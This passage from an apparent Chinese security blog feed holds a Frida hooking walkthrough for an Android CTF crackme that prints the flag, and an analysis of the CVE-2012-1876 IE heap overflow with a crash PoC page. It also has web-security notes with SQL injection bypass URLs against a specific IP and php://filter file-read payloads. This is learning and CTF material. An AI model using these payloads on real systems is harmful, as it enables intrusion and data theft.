class="keyword">if</span>(!EnhancedRobustUtils.invokeReflectStaticMethod(<span class="string">"isEmpty"</span>, TextUtils.class, <span class="keyword">this</span>.getRealParameter(<span class="keyword">new</span> Object[]&#123;EnhancedRobustUtils.invokeReflectMethod(<span class="string">"getText"</span>, v0, <span class="keyword">new</span> Object[<span class="number">0</span>], v10, EditText.class)&#125;), <span class="keyword">new</span> Class[]&#123;CharSequence.class&#125;).booleanValue()) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="keyword">this</span> <span class="keyword">instanceof</span> MainActivity$<span class="number">1</span>Patch)) &#123;</span><br><span class="line">                v0 = <span class="keyword">this</span>.originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">if</span>(!EnhancedRobustUtils.invokeReflectMethod(<span class="string">"equals"</span>, v0, <span class="keyword">this</span>.getRealParameter(<span class="keyword">new</span> Object[]&#123;v1&#125;), <span class="keyword">new</span> Class[]&#123;Object.class&#125;, String.class).booleanValue()) &#123;</span><br><span class="line">                goto label_217;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>((<span class="keyword">this</span> <span class="keyword">instanceof</span> MainActivity$<span class="number">1</span>Patch)) &#123;</span><br><span class="line">                v0 = <span class="keyword">this</span>.originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                v0_1 = <span class="keyword">this</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v0_2 = EnhancedRobustUtils.getFieldValue(<span class="string">"this$0"</span>, v0, MainActivity$<span class="number">1</span>.class);</span><br><span class="line">            v2_4 = <span class="keyword">new</span> Object[v11];</span><br><span class="line">            v2_4[<span class="number">0</span>] = v0_2;</span><br><span class="line">            v2_4[<span class="number">1</span>] = <span class="string">"恭喜大佬！密码正确！"</span>;</span><br><span class="line">            v2_4[v9] = <span class="keyword">new</span> Integer(<span class="number">0</span>);</span><br><span class="line">            v0_3 = <span class="keyword">this</span>.getRealParameter(v2_4);</span><br><span class="line">            v2_5 = Toast.class;</span><br><span class="line">            v3_2 = <span class="keyword">new</span> Class[v11];</span><br><span class="line">            v3_2[<span class="number">0</span>] = Context.class;</span><br><span class="line">            v3_2[<span class="number">1</span>] = CharSequence.class;</span><br><span class="line">            v3_2[v9] = Integer.TYPE;</span><br><span class="line">            v0_2 = EnhancedRobustUtils.invokeReflectStaticMethod(<span class="string">"makeText"</span>, v2_5, v0_3, v3_2);</span><br><span class="line">            <span class="keyword">if</span>((((MainActivity$<span class="number">1</span>Patch)v0_2)) == <span class="keyword">this</span>) &#123;</span><br><span class="line">                v0 = ((MainActivity$<span class="number">1</span>Patch)v0_2).originClass;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            EnhancedRobustUtils.invokeReflectMethod(<span class="string">"show"</span>, v0, <span class="keyword">new</span> Object[<span class="number">0</span>], v10, Toast.class);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">        label_217:</span><br><span class="line">            <span class="keyword">if</span>((<span class="keyword">this</span> <span class="keyword">instanceof</span> MainActivity$<span class="number">1</span>Patch)) &#123;</span><br><span class="line">                v0 = <span class="keyword">this</span>.originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                v0_1 = <span class="keyword">this</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v0_2 = EnhancedRobustUtils.getFieldValue(<span class="string">"this$0"</span>, v0, MainActivity$<span class="number">1</span>.class);</span><br><span class="line">            v2_4 = <span class="keyword">new</span> Object[v11];</span><br><span class="line">            v2_4[<span class="number">0</span>] = v0_2;</span><br><span class="line">            v2_4[<span class="number">1</span>] = <span class="string">"大佬莫急！再试试！"</span>;</span><br><span class="line">            v2_4[v9] = <span class="keyword">new</span> Integer(<span class="number">0</span>);</span><br><span class="line">            v0_3 = <span class="keyword">this</span>.getRealParameter(v2_4);</span><br><span class="line">            v2_5 = Toast.class;</span><br><span class="line">            v3_2 = <span class="keyword">new</span> Class[v11];</span><br><span class="line">            v3_2[<span class="number">0</span>] = Context.class;</span><br><span class="line">            v3_2[<span class="number">1</span>] = CharSequence.class;</span><br><span class="line">            v3_2[v9] = Integer.TYPE;</span><br><span class="line">            v0_2 = EnhancedRobustUtils.invokeReflectStaticMethod(<span class="string">"makeText"</span>, v2_5, v0_3, v3_2);</span><br><span class="line">            <span class="keyword">if</span>((((MainActivity$<span class="number">1</span>Patch)v0_2)) == <span class="keyword">this</span>) &#123;</span><br><span class="line">                v0 = ((MainActivity$<span class="number">1</span>Patch)v0_2).originClass;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            EnhancedRobustUtils.invokeReflectMethod(<span class="string">"show"</span>, v0, <span class="keyword">new</span> Object[<span class="number">0</span>], v10, Toast.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>观察代码可以很清晰的分析清楚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!EnhancedRobustUtils.invokeReflectMethod(<span class="string">"equals"</span>, v0, <span class="keyword">this</span>.getRealParameter(<span class="keyword">new</span> Object[]&#123;v1&#125;), <span class="keyword">new</span> Class[]&#123;Object.class&#125;, String.class).booleanValue()) &#123;</span><br><span class="line">              goto label_217;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>这条语句是判断的核心，如果我们绕过该判断，就能获得flag了。所以我们可以hook invokeReflectMethod该方法，看看能不能hook到equals的参数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    // Function to hook is defined here</span></span><br><span class="line"><span class="string">    var EnhancedRobustUtils = Java.use('com.meituan.robust.utils.EnhancedRobustUtils');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Whenever button is clicked</span></span><br><span class="line"><span class="string">    EnhancedRobustUtils.invokeReflectMethod.implementation = function (v1,v2,v3,v4,v5) &#123;</span></span><br><span class="line"><span class="string">        // Show a message to know that the function got called</span></span><br><span class="line"><span class="string">        send('invokeReflectMethod');</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        console.log('v1:' + JSON.stringify(v1));</span></span><br><span class="line"><span class="string">        // Call the original onClick handler</span></span><br><span class="line"><span class="string">        var result =  this.invokeReflectMethod(v1,v2,v3,v4,v5);</span></span><br><span class="line"><span class="string">        if(v1 == "</span>equals<span class="string">")</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            console.log('v2:' + v2);</span></span><br><span class="line"><span class="string">            console.log('v3:' + (v3));</span></span><br><span class="line"><span class="string">            console.log('v4:' + (v4));</span></span><br><span class="line"><span class="string">            console.log('v5:' + (v5));       </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">        // Set our values after running the original onClick handler</span></span><br><span class="line"><span class="string">        //this.m.value = 0;</span></span><br><span class="line"><span class="string">        //this.n.value = 1;</span></span><br><span class="line"><span class="string">        //this.cnt.value = 999;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Log to the console that it's done, and we should have the flag!</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'cn.chaitin.geektan.crackme'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">print(<span class="string">'[*] Running CTF'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p><p>运行后，可以得到如下flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] invokeReflectMethod</span><br><span class="line">v1:&quot;equals&quot;</span><br><span class="line">v2:tgg</span><br><span class="line">v3:DDCTF&#123;2517299225169920&#125;</span><br><span class="line">v4:class java.lang.Object</span><br><span class="line">v5:class java.lang.String</span><br></pre></td></tr></table></figure></p><p>第二种方法我们也可以hook toString该类。也能得到flag。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    // Function to hook is defined here</span></span><br><span class="line"><span class="string">    const StringBuilder = Java.use('java.lang.StringBuilder');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    StringBuilder.toString.implementation = function () &#123;</span></span><br><span class="line"><span class="string">            var result = this.toString();</span></span><br><span class="line"><span class="string">            console.log('StringBuilder.toString(); =&gt; ' + result);</span></span><br><span class="line"><span class="string">            return result;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'cn.chaitin.geektan.crackme'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">print(<span class="string">'[*] Running CTF'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p><p>运行结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder.toString(); =&gt; ::false:6</span><br><span class="line">StringBuilder.toString(); =&gt; ::false:6</span><br><span class="line">StringBuilder.toString(); =&gt; DDCTF&#123;2517299225169920&#125;</span><br><span class="line">StringBuilder.toString(); =&gt; ViewRootImpl[Toast]</span><br><span class="line">StringBuilder.toString(); =&gt; aq:native-post-ime:Toast</span><br></pre></td></tr></table></figure></p><p>frida也可以hook native层代码，后续更新。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a><br><a href="https://www.frida.re/docs/examples/android/" target="_blank" rel="noopener">https://www.frida.re/docs/examples/android/</a><br><a href="https://www.jianshu.com/p/ca8381d3e094" target="_blank" rel="noopener">https://www.jianshu.com/p/ca8381d3e094</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;frida是一个比较优秀的hook框架，xposed的框架对于frida来说，frida有着更加方便快捷的方式，其实我是不喜欢编写xpose
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2012-1876分析记录</title>
    <link href="https://foyjog.github.io/2019/01/10/CVE-2012-1876%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"/>
    <id>https://foyjog.github.io/2019/01/10/CVE-2012-1876分析记录/</id>
    <published>2019-01-10T13:03:28.000Z</published>
    <updated>2019-03-08T14:07:10.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个cve是比较典型的ie中的堆溢出的漏洞利用，网上有许多的分析的文章，但对于漏洞的调试还是要自己亲手调一遍才能转换为自己的知识，这里记录一些调试的时候遇到的问题和一些笔记。</p><h3 id="windbg的一些命令"><a href="#windbg的一些命令" class="headerlink" title="windbg的一些命令"></a>windbg的一些命令</h3><ol><li>symbol的设置：新建一个环境变量_NT_SYMBOL_PATH 值为: SRV<em>c:\mysymbol</em> <a href="http://msdl.microsoft.com/download/symbols" target="_blank" rel="noopener">http://msdl.microsoft.com/download/symbols</a></li><li>.sympath显示当前的symbol的配置</li><li>对于gflag.exe -i “名称” +hpc +hpa这些命令，进程名称一定要注意，比如可能是iexplore.exe 也可能是iexplore</li><li>ub，uf命令为反汇编，p单步，sxe ld:xxx设置dll断点之类lmm查看模块lmf具体路径之类，.reload /f mshtml.dll加载符号。.childdbg 1开启子进程调试</li><li>bp,bl，bu等等，bu ntdll!RtlFreeHeap “echo free heap;db poi(esp+c) l10;g”这样的可以用来做一些命令。</li><li>s -a 0x00000000 L?7fffffff “FuzzySecurity”查找命令</li><li>gflags.exe -i iexplore.exe +hpa</li></ol><h3 id="c-类的虚表"><a href="#c-类的虚表" class="headerlink" title="c++类的虚表"></a>c++类的虚表</h3><p>简单地说，每一个含有虚函数（无论是其本身的，还是继承而来的）的类都至少有一个与之对应的虚函数表，其中存放着该类所有的虚函数对应的函数指针。例：<br><img src="/img/xubiao.png" alt="虚表"><br>其中：<br>B的虚函数表中存放着B::foo和B::bar两个函数指针。<br>D的虚函数表中存放的既有继承自B的虚函数B::foo，又有重写（override）了基类虚函数B::bar的D::bar，还有新增的虚函数D::quz。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>漏洞分析网上有许多的文章，具体分析就不写了，主要讲改漏洞的大致成因所在。<br>我将poc改为如下，省去了col的span属性，更容易看清楚漏洞成因。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>ISBN<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Price<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>3476896<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>My first HTML<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>$53<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"> function over_trigger() &#123;</span></span><br><span class="line"><span class="undefined">        var obj_col = document.getElementById("132");</span></span><br><span class="line"><span class="undefined">        obj_col.width = "42765";</span></span><br><span class="line"><span class="undefined">        obj_col.span = 5;</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"> setTimeout("over_trigger();",1);</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ol><li>首先搞清楚span属性的性质，该属性作用于col的主要用来规定 col 元素应该横跨的列数。具体参考 <a href="http://www.runoob.com/tags/att-col-span.html" target="_blank" rel="noopener">http://www.runoob.com/tags/att-col-span.html</a> 即可。</li><li>浏览器首先渲染3个col，该值被存储在[CTableLayout+0x54]中，利用函数EnsueSizeWorker分配4个col内存大小来装下3个col。</li><li>通过js改变col的span属性，将span改为5，漏洞成因在这里出现，程序并没有重新将该span的值放入[CTableLayout+0x54]，在进入EnsueSizeWorker分配内存的条件中没有重新进行分配。</li><li>浏览器通过AdjustForCol为每个col调整属性，由于span规定了col元素应该横跨的列数，所以程序的错误的将span的值作为循环条件，导致在对第5个不存在的col调整属性的时候崩溃。<br>没有细致的分析CalculateMinMax之前的函数，我在调的时候发现[CTableLayout+0x54]存的值并不是span的值，如下代码<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"2"</span>&gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>ISBN<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Price<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>3476896<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>My first HTML<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>$53<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>调试的时候[CTableLayout+0x54]并不是2而是3。</p><p>###参考<br><a href="http://www.dbgtech.net/windbghelp/index.html" target="_blank" rel="noopener">http://www.dbgtech.net/windbghelp/index.html</a><br><a href="http://eternalsakura13.com/2018/03/10/cve2012_1876/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/10/cve2012_1876/</a><br><a href="https://bbs.pediy.com/thread-153363.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-153363.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这个cve是比较典型的ie中的堆溢出的漏洞利用，网上有许多的分析的文章，但对于漏洞的调试还是要自己亲手调一遍才能转换为自己的知识，这里记录一
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>初学web安全记录</title>
    <link href="https://foyjog.github.io/2018/12/28/%E5%88%9D%E5%AD%A6web%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://foyjog.github.io/2018/12/28/初学web安全记录/</id>
    <published>2018-12-28T01:24:50.000Z</published>
    <updated>2019-01-10T13:18:11.766Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知为啥突然想要学web安全了，之前一直没有学，感觉从事安全行业一些基本的web安全还是要懂一些，所以慢学慢记录吧。</p><h3 id="php-input和php-filter"><a href="#php-input和php-filter" class="headerlink" title="php://input和php://filter"></a>php://input和php://filter</h3><ol><li>php://filter/read=convert.base64-encode/resource=hint.php</li><li>file_get_contents(“php://input”) ,”php://input”可以为post的数据</li></ol><h3 id="一些字段"><a href="#一些字段" class="headerlink" title="一些字段"></a>一些字段</h3><ol><li>X-Forwarded-For</li><li>referer</li></ol><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><ol><li>if(exp1,exp2,epx3)</li><li>case when exp1 then sleep(4) else 1 end</li></ol><h3 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h3><ol><li>php别名：php2, php3, php4, php5, phps, pht, phtm, phtml</li><li>http头中的Content-type的值大小写可以绕过。</li><li>双字绕过，如and为aandnd，or为oorr，uniunionon，selecselectt </li><li>爆表名和字段之类<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,database()%23</span><br><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20table_name%20from%20infoorrmation_schema.tables%20where%20table_schema=database()%20limit%200,1)%23</span><br><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema=database()%20anandd%20table_name=%27flag1%27%20limit%200,1)%23</span><br><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema=database()%20anandd%20table_name=%27flag1%27%20limit%201,1)%23</span><br></pre></td></tr></table></figure></li></ol><h3 id="常见源码泄露"><a href="#常见源码泄露" class="headerlink" title="常见源码泄露"></a>常见源码泄露</h3><p><a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/55286.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;不知为啥突然想要学web安全了，之前一直没有学，感觉从事安全行业一些基本的web安全还是要懂一些，所以慢学慢记录吧。&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>离职小记</title>
    <link href="https://foyjog.github.io/2018/12/02/%E7%A6%BB%E8%81%8C%E5%B0%8F%E8%AE%B0/"/>
    <id>https://foyjog.github.io/2018/12/02/离职小记/</id>
    <published>2018-12-02T15:14:04.000Z</published>
    <updated>2018-12-02T15:20:13.678Z</updated>
    
    <content type="html"><![CDATA[<h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><p>从9月份开始就一直没有怎么写过博客啦，一方面在不停的找工作，一方面在360实习，做的模糊测试方向的工作，想要写点儿啥吧，也写不太出来，一直在分析一些so文件和找hikey内核的漏洞，确实没啥博客可做，但是实习的时候能力肯定是不停的再提高的。之前一直想去绿盟工作打比赛，感觉上会很有意思，但是最后还是选择了回深圳工作，但无论每条路怎么选择，都有其不同的感受吧，做到现在大概是做了一年左右的安全了，实际应该是6月份在腾讯实习开始系统学习安全知识的，之前都是靠一些兴趣偶尔学习一点，打打小众的ctf提高一下自己，但不得不说，做安全的感觉确实比开发要好，你会有很多未知的东西想要去学习，就会有干劲。希望在做安全的方向坚持下去，好好的做出一些东西吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;小记&quot;&gt;&lt;a href=&quot;#小记&quot; class=&quot;headerlink&quot; title=&quot;小记&quot;&gt;&lt;/a&gt;小记&lt;/h3&gt;&lt;p&gt;从9月份开始就一直没有怎么写过博客啦，一方面在不停的找工作，一方面在360实习，做的模糊测试方向的工作，想要写点儿啥吧，也写不太出来，一直在
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2012-0158的分析与利用</title>
    <link href="https://foyjog.github.io/2018/09/20/CVE-2012-0158%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>https://foyjog.github.io/2018/09/20/CVE-2012-0158的分析与利用/</id>
    <published>2018-09-20T02:54:17.000Z</published>
    <updated>2018-09-20T14:40:50.000Z</updated>
    
